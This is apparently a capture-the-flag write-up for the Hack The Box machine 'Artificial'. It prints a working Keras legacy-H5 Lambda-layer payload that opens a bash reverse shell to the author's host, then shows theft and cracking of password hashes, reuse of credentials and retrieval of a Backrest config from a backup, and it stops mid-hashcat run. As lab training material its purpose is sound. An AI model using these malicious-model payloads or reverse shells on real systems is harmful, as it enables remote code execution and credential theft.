## Reference Info
- My IP: `10.10.14.237` (given)
- Target IP: `10.10.11.74` (given)
- Target Domain: `artificial.htb` (given)
- User credentials: `gael:mattp006numbertwo` (discovered)
- Root backrest credentials: `backrest_root:!@#$%^` (discovered)

## Enumeration
### `nmap`
- We're going with the classic scan:
```nmap
[lkotlus@work] [~/Nerd/htb/artificial]    
(bash)> sudo nmap -sS -sV -sC -p- 10.10.11.74  
Nmap scan report for 10.10.11.74  
Host is up (0.023s latency).  
Not shown: 65533 closed tcp ports (reset)  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)  
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)  
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)  
80/tcp open  http    nginx 1.18.0 (Ubuntu)  
|_http-title: Did not follow redirect to http://artificial.htb/  
|_http-server-header: nginx/1.18.0 (Ubuntu)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 32.11 seconds
```
- Alright. Immediate thoughts:
	- SSH is clear, that version is secure. We can attempt some password spraying if we must.
	- The base `nginx` version would appear to be fine as well. Let's enumerate the website further.

### `whatweb`
- Pretty basic, we just see the same results on service versions and whatnot:
```nmap
[lkotlus@work] [~/Nerd/htb/artificial] 
(norm)> whatweb 10.10.11.74
http://10.10.11.74 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.74], RedirectLocation[http://artificial.htb/], Title[302 Found], nginx[1.18.0]
http://artificial.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.74], Script, Title[Artificial - AI Solutions], nginx[1.18.0]
```

### Manual Web
- So they're some sort of AI company. The site looks fancy and new.
- I made an account, and they allow us to upload models...
- There's a list of requirements, and they give a Dockerfile to use.
- I think I might be able to just upload arbitrary code.
- The expected file type is `.h5`, which is some hierarchical database thing. We'll need to see if I can get it to upload a web shell. It shows the filename, and very briefly will actually visit the page when you hit "View Predictions"
- There's also potential LFI from the `run_model` endpoint.

### `gobuster`
- Let's see what sorts of directories and pages we can find:
```gobuster
[lkotlus@work] [~/Nerd/wordlists]    
(bash)> gobuster dir -u http://artificial.htb/ -w SecLists/Discovery/Web-Content/common.txt  
===============================================================  
Gobuster v3.7  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://artificial.htb/  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                SecLists/Discovery/Web-Content/common.txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.7  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
/dashboard            (Status: 302) [Size: 199] [--> /login]  
/login                (Status: 200) [Size: 857]  
/logout               (Status: 302) [Size: 189] [--> /]  
/register             (Status: 200) [Size: 952]  
Progress: 4734 / 4734 (100.00%)  
===============================================================  
Finished  
===============================================================
```
- Just the pages I've already seen. Let's see if DNS pulls anything:
```gobuster
No results :(
```

### Software Versions
- So I don't know much more about the actual system, but I can learn from the Dockerfile and `requirements.txt`.
- Dockerfile:
	- Running `python:3.8-slim`
	- They're installing [`tensorflow_cpu-2.13.1`](https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl) from source for some reason
- `requirements.txt`
	- We can see here that they're still having you install `tensorflow-cpu==2.13.1` for some reason. 
- If I were to guess, this is a piece of the puzzle.

## Foothold
### Web Shell Attempt
- I can upload a `php` file with the wrong extension, but it doesn't get results when I attempt to run it.
- I don't think they're really loading the file, the `/run_model/` endpoint seems to load the model into `tensorflow_cpu` on the server.
### File Upload
- So it turns out that `.h5` files are capable of storing entire models.
- The real question is whether or not I am able to do some sort of injection with this.
- We can see that Keras Model Loading, especially with `.h5` files, is vulnerable. This is because models are actual programs that need to be loaded.
- I see a PoC [here](https://www.oligo.security/blog/tensorflow-keras-downgrade-attack-cve-2024-3660-bypass), and it says that [CVE-2024-3660](https://nvd.nist.gov/vuln/detail/CVE-2024-3660) allegedly got fixed. This sucks, because that CVE only applies to versions prior to 2.13... but they propose a way to bypass it!
- Oh. My. Goodness. This is some real stuff right here:
> This is the behavior of version 2.13 and later of the Keras API: an exception will be raised in a program that attempts to load a model with Lambda layers stored in version 3 of the format. <u>This check, however, does not exist int he prior versions of the API. Nor is the check performed on models that have been stored using earlier versions of the Keras serialization format (i.e., v2 SavedModel, ***legacy H5***)</u>
- You can't make this up. Data Scientists are the worst.
### Keras Downgrade Attack
- So all I need to do is use a vulnerable version of `tensorflow_cpu` and `keras`, create a malicious model, and upload it.
- Even though the system I upload to is patched, they allow legacy `.h5`, which means I should be able to create any old reverse shell that I want.
- Here's the PoC code:
```python
import tensorflow as tf

def exploit(x):
	import os
	os.system("echo pwned from execve")
	return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

### Building the Payload
- Alrighty.
- Let's create this bad boy, preferably in a Docker container so I don't have gigantic useless packages on my system (or use python 3.10 locally):
```a
[lkotlus@work] [~/Nerd/htb/artificial]    
(norm)> sudo docker run -v .:/exploit/ --entrypoint /bin/bash -it python:3.10-slim  
root@53e914f2ce75:/# pip install tensorflow-cpu==2.12.0
```
- To start, I'll build the PoC and see how it does:
```a
root@53e914f2ce75:/exploit# python3 build_payload.py    
2025-08-01 19:19:08.980217: I tensorflow/core/platform/cpu_feature_guard.cc:182] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.  
To enable the following instructions: AVX2 FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.  
pwned from execve
```
- Cool, now I just need to upload this to the site and see what happens.
- So clicking the "View Predictions" button doesn't actually show you any results. That sucks. I'd assume that this means it doesn't work.
- The homepage of the site shows some sample code, after building a model with that, I can see that the "View Predictions" button will show results. From this, I just need to build a vulnerable version of that code.
- After attempting a few vulnerabilities, I came to the realization that it's faster to build the docker image that they provide the Dockerfile for. This way I can test and debug to see why the payloads aren't working. Just to document, one exploit I tried out was:
```python
class ExploitLayer(tf.keras.layers.Layer):
    @property
    def output_shape(self):
        import subprocess
        result=subprocess.run(['ls'], capture_output=True, text=True)
        return (result.stdout, 1)
    
    def call(self, inputs):
        return inputs

# Build the model
model = keras.Sequential([
    layers.Dense(64, activation='relu', input_shape=(1,)),
    layers.Dense(64, activation='relu'),
    layers.Dense(1),
    ExploitLayer()
])

```
- This would assist if all ports were closed, as I overload the `output_shares` property. This makes it so `model.summary()` outputs the results of whatever command I run. If I required the ability to gain a remote shell, I could dump the contents of an SSH key or something like that.
- The custom layer approach is neat, but overly complicated. I finally tried out this approach:
```python
import numpy as np
import pandas as pd
import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers

np.random.seed(42)

# Create hourly data for a week
hours = np.arange(0, 24 * 7)
profits = np.random.rand(len(hours)) * 100

# Create a DataFrame
data = pd.DataFrame({
    'hour': hours,
    'profit': profits
})

X = data['hour'].values.reshape(-1, 1)
y = data['profit'].values

# Actual exploit zone
def exploit(x):
    import os
    os.system("/bin/bash -c \"bash -i >& /dev/tcp/10.10.14.237/2112 0>&1\"")
    return x

# Build the model
model = keras.Sequential([
    layers.Dense(64, activation='relu', input_shape=(1,)),
    layers.Dense(64, activation='relu'),
    layers.Dense(1),
    layers.Lambda(exploit)
])

# Compile the model
model.compile(optimizer='adam', loss='mean_squared_error')

# Train the model
model.fit(X, y, epochs=100, verbose=1)

model.summary()

# Save the model
model.save('profits_model.h5')

```

### Exploitation
- We have a winner! First, I had to set up a development container (as seen above). After that, I created a vulnerable container from the Dockerfile given and ran it to run with the host network in order to test a reverse shell:
```a
[lkotlus@work] [~/Nerd/htb/artificial]    
(bash)> sudo docker run --network host -v .:/exploit/ --entrypoint /bin/bash -it artificial:latest
```
- After this, I build the payload in the development container:
```a
root@6d696d1c3eec:/exploit# python3 build_payload.py    
/bin/bash: connect: Connection refused  
/bin/bash: line 1: /dev/tcp/10.10.14.237/2112: Connection refused  
Epoch 1/100  
/bin/bash: connect: Connection refused  
/bin/bash: line 1: /dev/tcp/10.10.14.237/2112: Connection refused  
/bin/bash: connect: Connection refused  
/bin/bash: line 1: /dev/tcp/10.10.14.237/2112: Connection refused
```
- Connections are refused for a variety of reasons. The docker container for development probably isn't allowing ports to open, and there isn't anything listening on the port. The next step is to start listening with netcat on my host:
```a
[lkotlus@work] [~/Nerd/htb/artificial]    
(bash)> nc -lvnp 2112
```
- And now I can attempt the execution of the payload on the victim container:
```a
root@lkotlus-precision7550:/exploit# python3 test_exploit.py    
2025-08-02 04:47:54.022430: I tensorflow/core/platform/cpu_feature_guard.cc:182] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.  
To enable the following instructions: AVX2 FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.
```
- I check the listener, and it's exactly what we like to see:
```a
[lkotlus@work] [~/Nerd/htb/artificial]    
(norm)> nc -lvnp 2112
Connection from 10.10.14.237:33398  
root@lkotlus-precision7550:/exploit#
```
- Now I just need to listen and try this out on the actual target. I set up the listener, upload the file, and... nothing. Not terrible though, the page still loads model predictions.
- I don't give up very easily, and attempt just switching my port to `8080` rather than my random `2112`, as the firewall is more likely to allow it. This works in my favor, and we popped our first shell for the machine!
```a
[lkotlus@work] [~/Nerd/htb/artificial]    
(norm)> nc -lvnp 8080  
Connection from 10.10.11.74:34928  
bash: cannot set terminal process group (806): Inappropriate ioctl for device  
bash: no job control in this shell  
app@artificial:~/app$
```

## Lateral Movement (part 1: user)
### Pillaging
- After looking in the `/home/` directory, I can see that the user I need to escalate to is `gael`. After snooping around for a bit, I find an interesting file:
```a
app@artificial:~/app/instance$ ls  
ls  
users.db  
app@artificial:~/app/instance$ cat users.db  
cat users.db  
���E�itablemodelmodelCREATE TABLE model (  
       id VARCHAR(36) NOT NULL,    
       filename VARCHAR(120) NOT NULL,    
       user_id INTEGER NOT NULL,    
       PRIMARY KEY (id),    
       FOREIGN KEY(user_id) REFERENCES user (id)  
))=indexsqlite_autoindex_model_1model�]�tableuseruserCREATE TABLE user (  
       id INTEGER NOT NULL,    
       username VARCHAR(100) NOT NULL,    
       email VARCHAR(120) NOT NULL,    
       password VARCHAR(200) NOT NULL,    
       PRIMARY KEY (id),    
       UNIQUE (username),    
       UNIQUE (email)  
O��B��O;tmpusertmpuser@tmp.com32ecc7b16bde356f5d47cacc011184586'Mfartfart@fart.com3f2f4295a5eb6ad967b832d35e048852<3Mmarymary@artificial.htbbf041041e57f1aff3be7ea1abd6129d0>5Mroyerroyer@artif  
icial.htbbc25b1f80f544c0ab451c02a3dca9fc6@7Mrobertrobert@artificial.htbb606c5f5136170f15444251665638b36<3Mmarkmark@artificial.htb0f3d8c76530022670f1c6029eed09ccb<3Mgaelgael@artificial.htbc991  
75974b6e192936d97224638a34f8  
��������  
       mpusefarmary    royer  
robermark       gael  
\�\PU[383f339d-2991-4be8-8656-2972536d38bf383f339d-2991-4be8-8656-2972536d38bf.h5PU[42e2b63c-3c84-4f29-afd8-6f965518965d42e2b63c-3c84-4f29-afd8-6f965518965d.h5  
���(U383f339d-2991-4be8-8656-2972536d38bf'U     42e2b63c-3c84-4f29-afd8-6f965518965d
```
- Very nice! We have a SQLite database of usernames and passwords! Notice that we can see the username `gael`. Let's exfiltrate the file and hope that he reuses his password.
```a
app@artificial:~/app/instance$ base64 users.db  
base64 users.db  
[DATA]
app@artificial:~/app/instance$ exit  
exit  
exit  
[lkotlus@work] [~/Nerd/htb/artificial]    
(bash)>
```
- Now I can recover the file by pasting the base64 into a text file and then running:
```a
[lkotlus@work] [~/Nerd/htb/artificial]    
(bash)> cat base64.txt | base64 -d > users.db
```
### Cracking
- Cool. So now I just need to actually open the database and read the data:
```a
[lkotlus@work] [~/Nerd/htb/artificial]    
(bash)> sqlite3 users.db    
SQLite version 3.50.3 2025-07-17 13:25:10  
Enter ".help" for usage hints.  
sqlite> .tables  
model  user    
sqlite> SELECT * FROM user;  
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8  
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb  
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36  
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6  
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0  
6|fart|fart@fart.com|3f2f4295a5eb6ad967b832d35e048852  
7|tmpuser|tmpuser@tmp.com|32ecc7b16bde356f5d47cacc01118458
```
- Very good. This is going faster than I expected, and I do appreciate the presence of one of my competitors. I tip my hat to you, "fart".
- These password hashes don't seem horribly complex (I recognize MD5 when I see it), so I'll just paste them into [CRACK STATION](https://crackstation.net) and see how it goes.
- THERE IT IS:
```a
c99175974b6e192936d97224638a34f8 -> mattp005numbertwo
```
- Here's to hoping he reused the password...

### Escalation
- Ideally the server is misconfigured to allow username+password login via SSH. That way I don't need to spin up another reverse shell just to run `su` and grab the key. Let's try:
```a
[lkotlus@work] [~/Nerd/htb/artificial]    
(bash)> ssh gael@artificial.htb  
The authenticity of host 'artificial.htb (10.10.11.74)' can't be established.  
ED25519 key fingerprint is SHA256:RfqGfdDw0WXbAPIqwri7LU4OspmhEFYPijXhBj6ceHs.  
This key is not known by any other names.  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Warning: Permanently added 'artificial.htb' (ED25519) to the list of known hosts.  
gael@artificial.htb's password:    
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)  
  
* Documentation:  https://help.ubuntu.com  
* Management:     https://landscape.canonical.com  
* Support:        https://ubuntu.com/pro  
  
System information as of Sat 02 Aug 2025 05:16:35 AM UTC  
  
 System load:           0.01  
 Usage of /:            61.5% of 7.53GB  
 Memory usage:          30%  
 Swap usage:            0%  
 Processes:             226  
 Users logged in:       1  
 IPv4 address for eth0: 10.10.11.74  
 IPv6 address for eth0: dead:beef::250:56ff:feb0:d60b  
  
  
Expanded Security Maintenance for Infrastructure is not enabled.  
  
0 updates can be applied immediately.  
  
Enable ESM Infra to receive additional future security updates.  
See https://ubuntu.com/esm or run: sudo pro status  
  
  
The list of available updates is more than a week old.  
To check for new updates run: sudo apt update  
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings  
  
  
Last login: Sat Aug 2 05:16:36 2025 from 10.10.14.237  
gael@artificial:~$
```
- And that's how it's done. My winnings:
```a
gael@artificial:~$ cat user.txt  
d107664f29af16ab4563661aa595b7c5
```

## Lateral Movement (part 2: root)
### Information
- There's just the one little flag file in `/home/gael/`, so nothing to write home about. I start off by checking the running services (thank you, CyberPatriot):
```a
gael@artificial:~$ service --status-all | grep +  
[ + ]  apparmor  
[ + ]  apport  
[ + ]  atd  
[ + ]  auditd  
[ + ]  cron  
[ + ]  dbus  
[ + ]  irqbalance  
[ + ]  kmod  
[ + ]  networking  
[ + ]  nginx  
[ + ]  open-vm-tools  
[ + ]  procps  
[ + ]  rsyslog  
[ + ]  ssh  
[ + ]  udev
```
- Nothing too exciting there. Let's look at our ports:
```a
gael@artificial:~$ netstat -tulpn  
Active Internet connections (only servers)  
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name       
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                      
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                      
tcp        0      0 127.0.0.1:9898          0.0.0.0:*               LISTEN      -                      
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                      
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                      
tcp6       0      0 :::22                   :::*                    LISTEN      -                      
tcp6       0      0 :::80                   :::*                    LISTEN      -                      
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
```
- That's fascinating. We've got DNS, SSH, and HTTP. That's all expected. But what's going on with ports `5000` and `9898`? Could be worth looking into.
- Any `sudo` access?
```a
gael@artificial:~$ sudo -l  
[sudo] password for gael:    
Sorry, user gael may not run sudo on artificial.
```
- No luck. Let's check kernel and distro versions:
```a
gael@artificial:~$ cat /etc/os-release  
NAME="Ubuntu"  
VERSION="20.04.6 LTS (Focal Fossa)"  
ID=ubuntu  
ID_LIKE=debian  
PRETTY_NAME="Ubuntu 20.04.6 LTS"  
VERSION_ID="20.04"  
HOME_URL="https://www.ubuntu.com/"  
SUPPORT_URL="https://help.ubuntu.com/"  
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"  
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"  
VERSION_CODENAME=focal  
UBUNTU_CODENAME=focal  
gael@artificial:~$ uname -r  
5.4.0-216-generic
```
- Nothing here, either. Looping back into the services, it looks like we're running `monkeycom`:
```a
[lkotlus@work] [~/Nerd/htb/artificial]    
(bash)> nmap -sV -p9898 artificial.htb  
Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-02 01:44 -0400  
Nmap scan report for artificial.htb (10.10.11.74)  
Host is up (0.020s latency).  
  
PORT     STATE  SERVICE   VERSION  
9898/tcp closed monkeycom  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```
- This really isn't normal...

### Monkey Business
- What even is this? It's closed to the outside, so let's see if I can learn more with a bit of `nc` magic from the inside:
```a
gael@artificial:~$ nc 127.0.0.1 9898  
  
HTTP/1.1 400 Bad Request  
Content-Type: text/plain; charset=utf-8  
Connection: close  
  
400 Bad Request
```
- Internal HTTP server! Now we're talking. Let's see if I can set up a proxy. Should be easy with SSH access, I can just tunnel the port:
```a
[lkotlus@work] [~/Nerd/htb/artificial]    
(bash)> ssh -L 9898:127.0.0.1:9898 gael@artificial.htb
```
- Now I can access this through `http://localhost:9898`, and... we're in business!
- Some `nmap` results:
```a
[lkotlus@work] [~/Nerd/htb/artificial]    
(bash)> sudo nmap -sV -p9898 127.0.0.1  
[sudo] password for lkotlus:    
Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-02 13:44 -0400  
Nmap scan report for localhost (127.0.0.1)  
Host is up (0.000065s latency).  
  
PORT     STATE SERVICE VERSION  
9898/tcp open  http    Golang net/http server  
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :  
SF-Port9898-TCP:V=7.97%I=7%D=8/2%Time=688E4E88%P=x86_64-pc-linux-gnu%r(Gen  
SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te  
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2  
SF:0Request")%r(GetRequest,1AF,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x  
SF:20bytes\r\nContent-Encoding:\x20gzip\r\nContent-Type:\x20text/html;\x20  
SF:charset=utf-8\r\nEtag:\x20\"8cc2ece8aafc605ef9a85fffce012901\"\r\nDate:  
SF:\x20Sat,\x2002\x20Aug\x202025\x2017:44:40\x20GMT\r\nContent-Length:\x20  
SF:226\r\n\r\n\x1f\x8b\x08\x08\xeb=\xb2g\0\x03index\.html\0\x8dP\xbd\x8e\x  
SF:c20\x0c~\x95\x90\x07h\xab\x82\(\x95\xd2\x0c\x07\xcc0\xb0\xdc\x98\xb3\]\  
SF:x9a#m\xa3\$\x20\xfa\xf6\$W8V\x16\xcb\xf6\xe7\xefG\x16\x8b\xdda{\xfa>\xe  
SF:eY\x17z#\xc5\xb3\x92B\)\x8c\x1e\.\xcc\x91i\xb8\x0f\x93!\xdf\x11\x05\xce  
SF::Gm\xc3\xf5\x80t\xcf6\xab\x1a\xeaz\x83\x19x\xcf\xa5\x08:\x18\x92_\n\.\x  
SF:8e\|\x10\xf9<\x7f\xa0SV\xa0\x8a\xa2\x82\xa7\xce\x9b\xa0a\x1c8\x0b\x93\x  
SF:a5\xd8\xf7\xeaL\xb9\x1d\xce/n\xabn\t\xcfpU\xd5\x80e\x99%L\x8a\|N\xff3\x  
SF:e2\$\x99@}c\x1a\x1b\xae\xacMX\x1c\xe3\xd2\x83\xd360\xef\xe0\?\xc1r\xdd\  
SF:x16mL\xf0\xeb_~\xfd\x88WC\x894\x9fG\^\xfe'\x1a\x1d\xd2\x97\x1e\xc5l\xf7  
SF:\x0e;\x01\0\0")%r(HTTPOptions,1AF,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ran  
SF:ges:\x20bytes\r\nContent-Encoding:\x20gzip\r\nContent-Type:\x20text/htm  
SF:l;\x20charset=utf-8\r\nEtag:\x20\"8cc2ece8aafc605ef9a85fffce012901\"\r\  
SF:nDate:\x20Sat,\x2002\x20Aug\x202025\x2017:44:40\x20GMT\r\nContent-Lengt  
SF:h:\x20226\r\n\r\n\x1f\x8b\x08\x08\xeb=\xb2g\0\x03index\.html\0\x8dP\xbd  
SF:\x8e\xc20\x0c~\x95\x90\x07h\xab\x82\(\x95\xd2\x0c\x07\xcc0\xb0\xdc\x98\  
SF:xb3\]\x9a#m\xa3\$\x20\xfa\xf6\$W8V\x16\xcb\xf6\xe7\xefG\x16\x8b\xdda{\x  
SF:fa>\xeeY\x17z#\xc5\xb3\x92B\)\x8c\x1e\.\xcc\x91i\xb8\x0f\x93!\xdf\x11\x  
SF:05\xce:Gm\xc3\xf5\x80t\xcf6\xab\x1a\xeaz\x83\x19x\xcf\xa5\x08:\x18\x92_  
SF:\n\.\x8e\|\x10\xf9<\x7f\xa0SV\xa0\x8a\xa2\x82\xa7\xce\x9b\xa0a\x1c8\x0b  
SF:\x93\xa5\xd8\xf7\xeaL\xb9\x1d\xce/n\xabn\t\xcfpU\xd5\x80e\x99%L\x8a\|N\  
SF:xff3\xe2\$\x99@}c\x1a\x1b\xae\xacMX\x1c\xe3\xd2\x83\xd360\xef\xe0\?\xc1  
SF:r\xdd\x16mL\xf0\xeb_~\xfd\x88WC\x894\x9fG\^\xfe'\x1a\x1d\xd2\x97\x1e\xc  
SF:5l\xf7\x0e;\x01\0\0")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Requ  
SF:est\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20  
SF:close\r\n\r\n400\x20Bad\x20Request");  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 27.31 seconds
```
- I just see a login page, but it shows that it's something running `Backrest 1.7.2`. Neat.
- Description from the GitHub:
> Backrest is a web-accessible backup solution built on top of [restic](https://restic.net/). Backrest provides a WebUI which wraps the restic CLI and makes it easy to create repos, browse snapshots, and restore files. Additionally, Backrest can run in the background and take an opinionated approach to scheduling snapshots and orchestrating repo health operations.
- Interesting. Let's see if `gael` has a login... fail. If he does have one, it isn't using this same password. I can go through these other `artificial.htb` accounts from the database to see if they have access, though:
```a
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
```
```a
gael:mattp005numbertwo
mark:NOT FOUND
robert:NOT FOUND
royer:NOT FOUND
mary:NOT FOUND
```
- That's pretty rough. This version of the service is fairly new, it was released February 16th, so it can't be that crazy. This does enable me to look through the release notes for all versions after this.
	- Nothing particularly crazy yet
- I don't want to resort to password spraying, but that might be what's required. This might be a red herring, so I'll check out port 5000.

### Unicorn Business
- Same port forwarding stuff, but this time with port 5000. Some `nmap` results...
```a
[lkotlus@work] [~/Nerd/htb/artificial]    
(bash)> sudo nmap -sV -p5000 127.0.0.1  
[sudo] password for lkotlus:    
Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-02 13:38 -0400  
Nmap scan report for localhost (127.0.0.1)  
Host is up (0.00013s latency).  
  
PORT     STATE SERVICE VERSION  
5000/tcp open  http    Gunicorn 20.0.4  
  
Service detection performed. Please report any incorrect results at https://nma  
p.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 6.99 seconds
```
- There's a vulnerability on this version, [CVE-2024-1135](https://nvd.nist.gov/vuln/detail/cve-2024-1135). I can't seem to find a PoC, and I'm not terribly convinced that HTTP Request Smuggling is going to be useful either way.

### Backrest 
- A little `find` magic helps me see the config files. Maybe I can steal some credentials.
```a
gael@artificial:/$ find / -iname "backrest"
[permission denied]
/usr/local/bin/backrest
[permission denied]
/opt/backrest  
/opt/backrest/.config/backrest  
/opt/backrest/backrest
[permission denied]
```
- Neat! Not super interested in the binary, but the configs are all in the `/opt/backrest/` directory. 
```a
gael@artificial:/opt/backrest$ ls -lah  
total 50M  
drwxr-xr-x 5 root root     4.0K Aug  2 20:20 .  
drwxr-xr-x 3 root root     4.0K Mar  4 22:19 ..  
-rwxr-xr-x 1 app  ssl-cert  25M Feb 16 19:38 backrest  
drwxr-xr-x 3 root root     4.0K Mar  3 21:27 .config  
-rwxr-xr-x 1 app  ssl-cert 3.0K Mar  3 04:28 install.sh  
-rw------- 1 root root       64 Mar  3 21:18 jwt-secret  
-rw-r--r-- 1 root root      76K Aug  2 20:20 oplog.sqlite  
-rw------- 1 root root        0 Mar  3 21:18 oplog.sqlite.lock  
-rw-r--r-- 1 root root      32K Aug  2 20:20 oplog.sqlite-shm  
-rw-r--r-- 1 root root        0 Aug  2 20:20 oplog.sqlite-wal  
drwxr-xr-x 2 root root     4.0K Mar  3 21:18 processlogs  
-rwxr-xr-x 1 root root      26M Mar  3 04:28 restic  
drwxr-xr-x 3 root root     4.0K Aug  2 20:20 tasklogs
```
- I don't have a ton of permissions here. I can read everything but the `jwt-secret`, `oplog.sqlite.lock`, `.config/backrest/config.json`, and `processlogs/backrest.log`. I'll put everything that I can into a common file and do some searching on it.
```a
gael@artificial:/opt/backrest$ cat * > ~/dump.txt
cat: jwt-secret: Permission denied
cat: oplog.sqlite.lock: Permission denied
cat: processlogs: Is a directory
cat: tasklogs: Is a directory
gael@artificial:/opt/backrest$ cat processlogs/* >> ~/dump.txt
cat: processlogs/backrest.log: Permission denied
gael@artificial:/opt/backrest$ cat tasklogs/* >> ~/dump.txt
```
- Not much luck here.

### `LinPEAS`
- This is starting to get desperate.
- It found some CVEs, I went down some rabbit holes, but ultimately nothing.

### Passwords
- Now you know I'm desperate.
- If this doesn't work, I'm finding a hint. 
- I got one more password:
```a
gael:c99175974b6e192936d97224638a34f8:mattp005numbertwo           
royer:bc25b1f80f544c0ab451c02a3dca9fc6:marwinnarak043414036
```
- I can try to login with this on backrest... fail.

### FINALLY
- So my user is in the `sysadm` group... there's a file where only `root` and members of this group have permissions. It's a backup of the backrest service located in `/var/backups/backrest_backup.tar.gz`!
```a
[lkotlus@work] [~/Nerd/htb/artificial]    
(bash)> scp gael@artificial.htb:/var/backups/backrest_backup.tar.gz .  
gael@artificial.htb's password:    
backrest_backup.tar.gz
[lkotlus@work] [~/Nerd/htb/artificial]    
(bash)> tar -xvf backrest_backup.tar.gz    
backrest/  
backrest/restic  
backrest/oplog.sqlite-wal  
backrest/oplog.sqlite-shm  
backrest/.config/  
backrest/.config/backrest/  
backrest/.config/backrest/config.json  
backrest/oplog.sqlite.lock  
backrest/backrest  
backrest/tasklogs/  
backrest/tasklogs/logs.sqlite-shm  
backrest/tasklogs/.inprogress/  
backrest/tasklogs/logs.sqlite-wal  
backrest/tasklogs/logs.sqlite  
backrest/oplog.sqlite  
backrest/jwt-secret  
backrest/processlogs/  
backrest/processlogs/backrest.log  
backrest/install.sh
```
- So now I have access to every single config. This is exactly what I need! 
```a
[lkotlus@work] [.../artificial/backrest/.config/backrest]    
(bash)> cat config.json    
{  
 "modno": 2,  
 "version": 4,  
 "instance": "Artificial",  
 "auth": {  
   "disabled": false,  
   "users": [  
     {  
       "name": "backrest_root",  
       "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"  
     }  
   ]  
 }  
}
```
- And there you have it. Now I just need to crack this `bcrypt` hash. We have it base64 encoded, so we first need to:
```a
[lkotlus@work] [~/Nerd/htb/artificial]    
(bash)> echo "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP" | base64 -d > backrest_hash.txt
```
- After that, I can start the brute force attack...
```a
[lkotlus@work] [~/Nerd/htb/artificial]    
(norm)> hashcat -m 3200 backrest_hash.txt ~/Nerd/wordlists/rockyou.txt    
hashcat (v6.2.6) starting  
  
nvmlDeviceGetFanSpeed(): Not Supported  
  
CUDA API (CUDA 12.9)  
====================  
* Device #1: Quadro T1000, 3625/3715 MB, 14MCU  
  
OpenCL API (OpenCL 3.0 CUDA 12.9.90) - Platform #1 [NVIDIA Corporation]  
=======================================================================  
* Device #2: Quadro T1000, skipped  
  
Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 72  
